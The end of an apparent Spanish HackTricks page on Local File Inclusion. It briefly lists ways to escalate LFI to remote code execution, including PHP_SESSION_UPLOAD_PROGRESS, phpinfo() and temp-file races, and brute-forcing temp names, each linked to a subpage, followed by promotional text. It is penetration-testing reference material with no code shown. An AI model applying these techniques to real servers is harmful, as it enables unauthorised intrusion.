### A trav√©s de PHP\_SESSION\_UPLOAD\_PROGRESS

Si encuentras una **Inclusi√≥n Local de Archivos** incluso si **no tienes una sesi√≥n** y `session.auto_start` est√° en `Off`. Si proporcionas **`PHP_SESSION_UPLOAD_PROGRESS`** en datos **POST multipart**, PHP **habilitar√° la sesi√≥n por ti**. Podr√≠as abusar de esto para obtener RCE:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### A trav√©s de cargas de archivos temporales en Windows

Si encuentras una **Inclusi√≥n Local de Archivos** y el servidor est√° en **Windows**, podr√≠as obtener RCE:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### A trav√©s de phpinfo() (file\_uploads = on)

Si encuentras una **Inclusi√≥n Local de Archivos** y un archivo que expone **phpinfo()** con file\_uploads = on, puedes obtener RCE:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### A trav√©s de compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Divulgaci√≥n de Ruta

Si encuentras una **Inclusi√≥n Local de Archivos** y puedes **filtrar la ruta** del archivo temporal PERO el **servidor** est√° **verificando** si el **archivo a incluir tiene marcas PHP**, puedes intentar **burlar esa verificaci√≥n** con esta **Condici√≥n de Carrera**:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### A trav√©s de espera eterna + fuerza bruta

Si puedes abusar de la LFI para **subir archivos temporales** y hacer que el servidor **cuelgue** la ejecuci√≥n de PHP, entonces podr√≠as **fuerza bruta nombres de archivo durante horas** para encontrar el archivo temporal:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### Hasta Error Fatal

Si incluyes cualquiera de los archivos `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Necesitas incluir el mismo dos veces para lanzar ese error).

**No s√© c√≥mo es √∫til esto pero podr√≠a serlo.**\
_Incluso si causas un Error Fatal de PHP, los archivos temporales de PHP subidos se eliminan._

<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

## Referencias

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

√önete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de bugs!

**Perspectivas de Hacking**\
Invol√∫crate con contenido que profundiza en la emoci√≥n y desaf√≠os del hacking

**Noticias de Hacking en Tiempo Real**\
Mantente actualizado con el mundo del hacking a trav√©s de noticias e informaci√≥n en tiempo real

**√öltimos Anuncios**\
Mantente informado sobre los nuevos programas de recompensas por bugs que se lanzan y actualizaciones importantes de plataformas

**√önete a nosotros en** [**Discord**](https://discord.com/invite/N3FrSbmwdy) y comienza a colaborar con los mejores hackers hoy!

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
